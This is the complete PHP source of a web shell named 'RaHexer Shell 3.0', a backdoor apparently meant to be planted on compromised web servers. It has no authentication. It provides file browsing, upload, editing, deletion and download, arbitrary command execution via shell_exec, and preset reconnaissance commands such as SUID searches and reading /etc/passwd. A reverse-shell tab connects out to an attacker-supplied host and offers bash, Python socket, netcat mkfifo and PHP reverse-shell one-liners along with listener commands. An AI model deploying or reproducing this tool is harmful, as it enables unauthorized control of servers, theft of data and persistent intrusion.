<?php
/* RaHexer Shell 3.0 | Modern Web Interface */
error_reporting(0);
session_start();

// Modern UI with animations and enhanced features
$current_path = isset($_GET['path']) ? realpath($_GET['path']) : (isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '/');
if (!$current_path || !is_dir($current_path)) $current_path = '/';

// Handle all operations
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // File upload with chunk support
    if (isset($_FILES['upload'])) {
        $target_file = $current_path . '/' . basename($_FILES['upload']['name']);
        if (move_uploaded_file($_FILES['upload']['tmp_name'], $target_file)) {
            $_SESSION['status'] = ['type' => 'success', 'message' => 'File uploaded successfully'];
        } else {
            $_SESSION['status'] = ['type' => 'error', 'message' => 'Upload failed'];
        }
    }
    // File operations
    elseif (isset($_POST['operation'])) {
        switch ($_POST['operation']) {
            case 'delete':
                $target = $current_path . '/' . basename($_POST['target']);
                if (is_file($target)) unlink($target);
                elseif (is_dir($target)) rmdir($target);
                $_SESSION['status'] = ['type' => 'success', 'message' => 'Deleted successfully'];
                break;
                
            case 'rename':
                $old = $current_path . '/' . basename($_POST['old_name']);
                $new = $current_path . '/' . basename($_POST['new_name']);
                rename($old, $new);
                $_SESSION['status'] = ['type' => 'success', 'message' => 'Renamed successfully'];
                break;
                
            case 'new_folder':
                $new_folder = $current_path . '/' . basename($_POST['folder_name']);
                if (!file_exists($new_folder)) mkdir($new_folder, 0755);
                $_SESSION['status'] = ['type' => 'success', 'message' => 'Folder created'];
                break;
                
            case 'edit_file':
                file_put_contents($current_path . '/' . basename($_POST['filename']), $_POST['content']);
                $_SESSION['status'] = ['type' => 'success', 'message' => 'File saved'];
                break;
                
            case 'command':
                $_SESSION['command_output'] = shell_exec($_POST['command']);
                break;
                
            case 'reverse_shell':
                $host = $_POST['host'];
                $port = (int)$_POST['port'];
                $shell = $_POST['shell'] ?? '/bin/bash';
                $cmd = "php -r '\$s=fsockopen(\"$host\",$port);system(\"$shell <&3 >&3 2>&3\");' > /dev/null 2>&1 &";
                exec($cmd);
                $_SESSION['status'] = ['type' => 'success', 'message' => 'Reverse shell attempted'];
                break;
        }
    }
}

// Handle file download
if (isset($_GET['download'])) {
    $file = $current_path . '/' . basename($_GET['download']);
    if (is_file($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// Handle file view/edit
$editing_file = '';
$file_content = '';
if (isset($_GET['edit'])) {
    $editing_file = basename($_GET['edit']);
    $file_path = $current_path . '/' . $editing_file;
    if (is_file($file_path)) {
        $file_content = htmlspecialchars(file_get_contents($file_path));
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RaHexer Shell 3.0</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@500&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #ff2a6d;
            --secondary: #05d9e8;
            --dark: #0d0221;
            --darker: #01012b;
            --light: #d1f7ff;
            --success: #00ff85;
            --error: #ff2a6d;
            --warning: #f9f002;
        }
        
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            font-family: 'JetBrains Mono', monospace;
            background: var(--dark);
            color: var(--light);
            line-height: 1.6;
            overflow-x: hidden;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        header {
            background: linear-gradient(135deg, var(--darker) 0%, var(--dark) 100%);
            padding: 15px 25px;
            border-bottom: 2px solid var(--primary);
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
            position: relative;
            z-index: 100;
        }
        
        .logo {
            font-family: 'Orbitron', sans-serif;
            color: var(--primary);
            font-size: 1.8rem;
            text-shadow: 0 0 10px var(--primary);
            letter-spacing: 2px;
            animation: glow 2s ease-in-out infinite alternate;
        }
        
        @keyframes glow {
            from { text-shadow: 0 0 5px var(--primary); }
            to { text-shadow: 0 0 15px var(--primary), 0 0 20px var(--secondary); }
        }
        
        .status-message {
            padding: 12px;
            margin: 15px 0;
            border-radius: 4px;
            display: flex;
            align-items: center;
            animation: slideIn 0.5s ease-out;
            transform-origin: top;
        }
        
        @keyframes slideIn {
            from { transform: translateY(-20px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        
        .status-success {
            background: rgba(0, 255, 133, 0.1);
            border-left: 4px solid var(--success);
            color: var(--success);
        }
        
        .status-error {
            background: rgba(255, 42, 109, 0.1);
            border-left: 4px solid var(--error);
            color: var(--error);
        }
        
        .panel {
            background: rgba(1, 1, 43, 0.7);
            border: 1px solid rgba(5, 217, 232, 0.2);
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            backdrop-filter: blur(10px);
            transition: all 0.3s ease;
        }
        
        .panel:hover {
            border-color: rgba(5, 217, 232, 0.4);
            box-shadow: 0 8px 32px rgba(5, 217, 232, 0.1);
        }
        
        .panel-title {
            color: var(--secondary);
            margin-bottom: 15px;
            font-size: 1.3rem;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .panel-title svg {
            width: 24px;
            height: 24px;
            fill: var(--secondary);
        }
        
        .breadcrumb {
            display: flex;
            align-items: center;
            flex-wrap: wrap;
            gap: 5px;
            padding: 10px 0;
            font-size: 0.9rem;
        }
        
        .breadcrumb a {
            color: var(--light);
            text-decoration: none;
            transition: all 0.3s;
            padding: 5px;
            border-radius: 4px;
        }
        
        .breadcrumb a:hover {
            color: var(--primary);
            background: rgba(255, 42, 109, 0.1);
        }
        
        .breadcrumb .separator {
            color: var(--secondary);
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 15px 0;
            font-size: 0.9rem;
        }
        
        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid rgba(5, 217, 232, 0.1);
        }
        
        th {
            background: rgba(5, 217, 232, 0.05);
            color: var(--secondary);
            font-weight: 700;
        }
        
        tr {
            transition: all 0.3s;
        }
        
        tr:hover {
            background: rgba(255, 42, 109, 0.05);
        }
        
        .file-icon {
            margin-right: 8px;
            color: var(--secondary);
        }
        
        .folder-icon {
            color: var(--primary);
            margin-right: 8px;
        }
        
        .file-actions {
            display: flex;
            gap: 8px;
        }
        
        .btn {
            padding: 8px 16px;
            border-radius: 4px;
            border: none;
            font-family: inherit;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s;
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }
        
        .btn-primary {
            background: var(--primary);
            color: white;
        }
        
        .btn-primary:hover {
            background: #ff0055;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(255, 42, 109, 0.3);
        }
        
        .btn-secondary {
            background: rgba(5, 217, 232, 0.1);
            color: var(--secondary);
            border: 1px solid rgba(5, 217, 232, 0.3);
        }
        
        .btn-secondary:hover {
            background: rgba(5, 217, 232, 0.2);
            border-color: var(--secondary);
        }
        
        .btn-sm {
            padding: 5px 10px;
            font-size: 0.8rem;
        }
        
        input, textarea, select {
            background: rgba(5, 217, 232, 0.05);
            border: 1px solid rgba(5, 217, 232, 0.3);
            color: var(--light);
            padding: 10px 15px;
            border-radius: 4px;
            font-family: inherit;
            width: 100%;
            margin: 8px 0;
            transition: all 0.3s;
        }
        
        input:focus, textarea:focus, select:focus {
            outline: none;
            border-color: var(--secondary);
            box-shadow: 0 0 0 2px rgba(5, 217, 232, 0.2);
        }
        
        textarea {
            min-height: 300px;
            resize: vertical;
        }
        
        .progress-container {
            width: 100%;
            background: rgba(5, 217, 232, 0.1);
            border-radius: 4px;
            margin: 15px 0;
            overflow: hidden;
            height: 8px;
        }
        
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, var(--primary), var(--secondary));
            width: 0%;
            transition: width 0.3s;
            border-radius: 4px;
        }
        
        .upload-status {
            font-size: 0.9rem;
            color: var(--secondary);
            margin-top: 5px;
        }
        
        pre {
            background: rgba(0, 0, 0, 0.3);
            padding: 15px;
            border-radius: 4px;
            overflow-x: auto;
            font-family: 'JetBrains Mono', monospace;
            border-left: 3px solid var(--secondary);
            margin: 15px 0;
        }
        
        .tab-container {
            display: flex;
            border-bottom: 1px solid rgba(5, 217, 232, 0.3);
            margin-bottom: 15px;
        }
        
        .tab {
            padding: 10px 20px;
            cursor: pointer;
            border-bottom: 3px solid transparent;
            transition: all 0.3s;
        }
        
        .tab.active {
            border-bottom-color: var(--primary);
            color: var(--primary);
        }
        
        .tab-content {
            display: none;
        }
        
        .tab-content.active {
            display: block;
            animation: fadeIn 0.5s ease-out;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 15px;
            margin: 15px 0;
        }
        
        .modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.3s;
        }
        
        .modal.active {
            opacity: 1;
            pointer-events: all;
        }
        
        .modal-content {
            background: var(--darker);
            border: 1px solid var(--primary);
            border-radius: 8px;
            padding: 25px;
            max-width: 600px;
            width: 90%;
            max-height: 90vh;
            overflow-y: auto;
            transform: scale(0.9);
            transition: transform 0.3s;
        }
        
        .modal.active .modal-content {
            transform: scale(1);
        }
        
        .modal-close {
            position: absolute;
            top: 15px;
            right: 15px;
            background: none;
            border: none;
            color: var(--light);
            font-size: 1.5rem;
            cursor: pointer;
        }
        
        .pulse {
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(255, 42, 109, 0.7); }
            70% { box-shadow: 0 0 0 10px rgba(255, 42, 109, 0); }
            100% { box-shadow: 0 0 0 0 rgba(255, 42, 109, 0); }
        }
        
        @media (max-width: 768px) {
            .container {
                padding: 10px;
            }
            
            th, td {
                padding: 8px;
                font-size: 0.8rem;
            }
            
            .file-actions {
                flex-direction: column;
                gap: 5px;
            }
            
            .btn {
                padding: 6px 12px;
                font-size: 0.8rem;
            }
        }
    </style>
</head>
<body>
    <header>
        <div class="logo">RaHexer Shell 3.0</div>
        <div style="color: var(--secondary); font-size: 0.9rem;">
            <?= $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown Server' ?>
        </div>
    </header>

    <div class="container">
        <?php if (isset($_SESSION['status'])): ?>
            <div class="status-message status-<?= $_SESSION['status']['type'] ?>">
                <?= $_SESSION['status']['message'] ?>
            </div>
            <?php unset($_SESSION['status']); ?>
        <?php endif; ?>

        <!-- Navigation Panel -->
        <div class="panel">
            <div class="panel-title">
                <svg viewBox="0 0 24 24"><path d="M10,4H4C2.89,4 2,4.89 2,6V18A2,2 0 0,0 4,20H20A2,2 0 0,0 22,18V8C22,6.89 21.1,6 20,6H12L10,4Z"/></svg>
                <span>Navigation</span>
            </div>
            
            <div class="breadcrumb">
                <a href="?path=/">Root</a>
                <?php
                $crumbs = explode('/', trim($current_path, '/'));
                $current = '';
                foreach ($crumbs as $crumb) {
                    if (!empty($crumb)) {
                        $current .= '/' . $crumb;
                        echo '<span class="separator">/</span>';
                        echo '<a href="?path=' . urlencode($current) . '">' . htmlspecialchars($crumb) . '</a>';
                    }
                }
                ?>
            </div>
            
            <form method="get" style="display: flex; gap: 10px;">
                <input type="text" name="path" value="<?= htmlspecialchars($current_path) ?>" placeholder="Enter path">
                <button type="submit" class="btn btn-secondary">Go</button>
            </form>
        </div>

        <!-- Main Tabs -->
        <div class="panel">
            <div class="tab-container">
                <div class="tab active" data-tab="file-manager">File Manager</div>
                <div class="tab" data-tab="command-exec">Command Exec</div>
                <div class="tab" data-tab="reverse-shell">Reverse Shell</div>
                <div class="tab" data-tab="upload">Upload</div>
            </div>
            
            <!-- File Manager Tab -->
            <div class="tab-content active" id="file-manager">
                <div style="display: flex; gap: 10px; margin-bottom: 15px;">
                    <button class="btn btn-secondary btn-sm" onclick="showModal('new-folder-modal')">
                        New Folder
                    </button>
                    <button class="btn btn-secondary btn-sm" onclick="showModal('rename-modal')">
                        Rename
                    </button>
                </div>
                
                <table>
                    <thead>
                        <tr>
                            <th>Name</th>
                            <th>Size</th>
                            <th>Modified</th>
                            <th>Permissions</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php if ($current_path !== '/' && dirname($current_path) !== $current_path): ?>
                            <tr>
                                <td colspan="5">
                                    <a href="?path=<?= urlencode(dirname($current_path)) ?>" style="color: var(--secondary); text-decoration: none;">
                                        <span class="folder-icon">📁</span> ..
                                    </a>
                                </td>
                            </tr>
                        <?php endif; ?>
                        
                        <?php
                        $items = scandir($current_path);
                        foreach ($items as $item) {
                            if ($item === '.' || $item === '..') continue;
                            
                            $full_path = $current_path . '/' . $item;
                            $is_dir = is_dir($full_path);
                            $size = $is_dir ? '-' : format_size(filesize($full_path));
                            $modified = date('Y-m-d H:i', filemtime($full_path));
                            $perms = substr(sprintf('%o', fileperms($full_path)), -4);
                            
                            echo '<tr>';
                            echo '<td>';
                            echo $is_dir ? '<span class="folder-icon">📁</span>' : '<span class="file-icon">📄</span>';
                            echo '<a href="' . ($is_dir ? '?path=' . urlencode($full_path) : '?path=' . urlencode($current_path) . '&edit=' . urlencode($item)) . '" style="color: inherit; text-decoration: none;">';
                            echo htmlspecialchars($item);
                            echo '</a>';
                            echo '</td>';
                            echo '<td>' . $size . '</td>';
                            echo '<td>' . $modified . '</td>';
                            echo '<td>' . $perms . '</td>';
                            echo '<td class="file-actions">';
                            if (!$is_dir) {
                                echo '<a href="?path=' . urlencode($current_path) . '&download=' . urlencode($item) . '" class="btn btn-secondary btn-sm">Download</a>';
                            }
                   echo '<form method="post" style="display: inline;">
                                    <input type="hidden" name="operation" value="delete">
                                    <input type="hidden" name="target" value="' . htmlspecialchars($item) . '">
                                    <button type="submit" class="btn btn-secondary btn-sm" onclick="return confirm(\'Are you sure?\')">Delete</button>
                                  </form>';
                            echo '</td>';
                            echo '</tr>';
                        }
                        
                        function format_size($bytes) {
                            if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
                            if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
                            if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
                            return $bytes . ' bytes';
                        }
                        ?>
                    </tbody>
                </table>
            </div>
            
            <!-- Command Execution Tab -->
            <div class="tab-content" id="command-exec">
                <form method="post">
                    <input type="hidden" name="operation" value="command">
                    <input type="text" name="command" placeholder="Enter command (e.g., ls -la, whoami)" value="<?= isset($_POST['command']) ? htmlspecialchars($_POST['command']) : 'ls -la' ?>">
                    <button type="submit" class="btn btn-primary">Execute</button>
                </form>
                
                <?php if (isset($_SESSION['command_output'])): ?>
                    <pre><?= htmlspecialchars($_SESSION['command_output']) ?></pre>
                    <?php unset($_SESSION['command_output']); ?>
                <?php endif; ?>
                
                <div style="margin-top: 20px;">
                    <h3 style="color: var(--secondary); margin-bottom: 10px;">Common Commands</h3>
                    <div class="grid">
                        <button class="btn btn-secondary" onclick="document.querySelector('[name=command]').value='uname -a'">System Info</button>
                        <button class="btn btn-secondary" onclick="document.querySelector('[name=command]').value='id'">Current User</button>
                        <button class="btn btn-secondary" onclick="document.querySelector('[name=command]').value='find / -perm -4000 -type f 2>/dev/null'">SUID Files</button>
                        <button class="btn btn-secondary" onclick="document.querySelector('[name=command]').value='netstat -tulnp'">Network Connections</button>
                        <button class="btn btn-secondary" onclick="document.querySelector('[name=command]').value='ps aux'">Running Processes</button>
                        <button class="btn btn-secondary" onclick="document.querySelector('[name=command]').value='cat /etc/passwd'">User Accounts</button>
                    </div>
                </div>
            </div>
            
            <!-- Reverse Shell Tab -->
            <div class="tab-content" id="reverse-shell">
                <form method="post">
                    <input type="hidden" name="operation" value="reverse_shell">
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 15px;">
                        <div>
                            <label style="display: block; margin-bottom: 5px; color: var(--secondary);">Host</label>
                            <input type="text" name="host" placeholder="Your IP" required>
                        </div>
                        <div>
                            <label style="display: block; margin-bottom: 5px; color: var(--secondary);">Port</label>
                            <input type="number" name="port" placeholder="4444" required>
                        </div>
                    </div>
                    
                    <div style="margin-bottom: 15px;">
                        <label style="display: block; margin-bottom: 5px; color: var(--secondary);">Shell Type</label>
                        <select name="shell">
                            <option value="/bin/bash">Bash</option>
                            <option value="/bin/sh">Sh</option>
                            <option value="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"HOST\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'">Python</option>
                            <option value="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc HOST PORT >/tmp/f">Netcat</option>
                            <option value="php -r '\$s=fsockopen(\"HOST\",PORT);system(\"/bin/sh <&3 >&3 2>&3\");'">PHP</option>
                        </select>
                    </div>
                    
                    <button type="submit" class="btn btn-primary pulse">Connect Reverse Shell</button>
                </form>
                
                <div style="margin-top: 20px;">
                    <h3 style="color: var(--secondary); margin-bottom: 10px;">Listener Commands</h3>
                    <pre>nc -lvnp 4444</pre>
                    <pre>socat TCP-LISTEN:4444 STDOUT</pre>
                    <pre>rlwrap nc -lvnp 4444</pre>
                </div>
            </div>
            
            <!-- Upload Tab -->
            <div class="tab-content" id="upload">
                <form id="upload-form" method="post" enctype="multipart/form-data">
                    <input type="file" name="upload" required>
                    <button type="submit" class="btn btn-primary">Upload File</button>
                </form>
                
                <div class="progress-container">
                    <div class="progress-bar" id="progress-bar"></div>
                </div>
                <div class="upload-status" id="upload-status"></div>
                
                <div style="margin-top: 20px;">
                    <h3 style="color: var(--secondary); margin-bottom: 10px;">Quick Upload</h3>
                    <div class="grid">
                        <button class="btn btn-secondary" onclick="document.querySelector('[name=upload]').value=null; document.querySelector('[name=upload]').dispatchEvent(new Event('change'))">Clear</button>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- File Editor -->
        <?php if (!empty($editing_file)): ?>
        <div class="panel">
            <div class="panel-title">
                <svg viewBox="0 0 24 24"><path d="M20.71,7.04C21.1,6.65 21.1,6 20.71,5.63L18.37,3.29C18,2.9 17.35,2.9 16.96,3.29L15.12,5.12L18.87,8.87M3,17.25V21H6.75L17.81,9.93L14.06,6.18L3,17.25Z"/></svg>
                <span>Editing: <?= htmlspecialchars($editing_file) ?></span>
            </div>
            
            <form method="post">
                <input type="hidden" name="operation" value="edit_file">
                <input type="hidden" name="filename" value="<?= htmlspecialchars($editing_file) ?>">
                <textarea name="content"><?= $file_content ?></textarea>
                <div style="display: flex; gap: 10px; margin-top: 15px;">
                    <button type="submit" class="btn btn-primary">Save Changes</button>
                    <a href="?path=<?= urlencode($current_path) ?>" class="btn btn-secondary">Cancel</a>
                </div>
            </form>
        </div>
        <?php endif; ?>
    </div>
    
    <!-- Modals -->
    <div class="modal" id="new-folder-modal">
        <div class="modal-content">
            <button class="modal-close" onclick="hideModal('new-folder-modal')">&times;</button>
            <h2 style="color: var(--primary); margin-bottom: 15px;">Create New Folder</h2>
            <form method="post">
                <input type="hidden" name="operation" value="new_folder">
                <input type="text" name="folder_name" placeholder="Folder name" required>
                <div style="display: flex; gap: 10px; margin-top: 15px;">
                    <button type="submit" class="btn btn-primary">Create</button>
                    <button type="button" class="btn btn-secondary" onclick="hideModal('new-folder-modal')">Cancel</button>
                </div>
            </form>
        </div>
    </div>
    
    <div class="modal" id="rename-modal">
        <div class="modal-content">
            <button class="modal-close" onclick="hideModal('rename-modal')">&times;</button>
            <h2 style="color: var(--primary); margin-bottom: 15px;">Rename File/Folder</h2>
            <form method="post">
                <input type="hidden" name="operation" value="rename">
                <input type="text" name="old_name" placeholder="Current name" required>
                <input type="text" name="new_name" placeholder="New name" required>
                <div style="display: flex; gap: 10px; margin-top: 15px;">
                    <button type="submit" class="btn btn-primary">Rename</button>
                    <button type="button" class="btn btn-secondary" onclick="hideModal('rename-modal')">Cancel</button>
                </div>
            </form>
        </div>
    </div>

    <script>
        // Tab switching
        document.querySelectorAll('.tab').forEach(tab => {
            tab.addEventListener('click', () => {
                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
                
                tab.classList.add('active');
                document.getElementById(tab.dataset.tab).classList.add('active');
            });
        });
        
        // Modal functions
        function showModal(id) {
            document.getElementById(id).classList.add('active');
        }
        
        function hideModal(id) {
            document.getElementById(id).classList.remove('active');
        }
        
        // Close modals when clicking outside
        document.querySelectorAll('.modal').forEach(modal => {
            modal.addEventListener('click', function(e) {
                if (e.target === this) {
                    this.classList.remove('active');
                }
            });
        });
        
        // File upload with progress
        document.getElementById('upload-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const formData = new FormData(this);
            const xhr = new XMLHttpRequest();
            
            xhr.upload.onprogress = function(e) {
                if (e.lengthComputable) {
                    const percent = Math.round((e.loaded / e.total) * 100);
                    document.getElementById('progress-bar').style.width = percent + '%';
                    document.getElementById('upload-status').textContent = 
                        `Uploading: ${percent}% (${formatBytes(e.loaded)} / ${formatBytes(e.total)})`;
                }
            };
            
            xhr.onload = function() {
                if (xhr.status === 200) {
                    document.getElementById('upload-status').innerHTML = 
                        '<span style="color: var(--success);">Upload complete! Refreshing...</span>';
                    setTimeout(() => location.reload(), 1000);
                }
            };
            
            xhr.open('POST', '', true);
            xhr.send(formData);
        });
        
        function formatBytes(bytes) {
            if (bytes >= 1073741824) return (bytes / 1073741824).toFixed(2) + ' GB';
            if (bytes >= 1048576) return (bytes / 1048576).toFixed(2) + ' MB';
            if (bytes >= 1024) return (bytes / 1024).toFixed(2) + ' KB';
            return bytes + ' bytes';
        }
        
        // Add animation to panels on load
        document.addEventListener('DOMContentLoaded', () => {
            document.querySelectorAll('.panel').forEach((panel, index) => {
                setTimeout(() => {
                    panel.style.opacity = '1';
                    panel.style.transform = 'translateY(0)';
                }, index * 100);
            });
        });
    </script>
</body>
</html>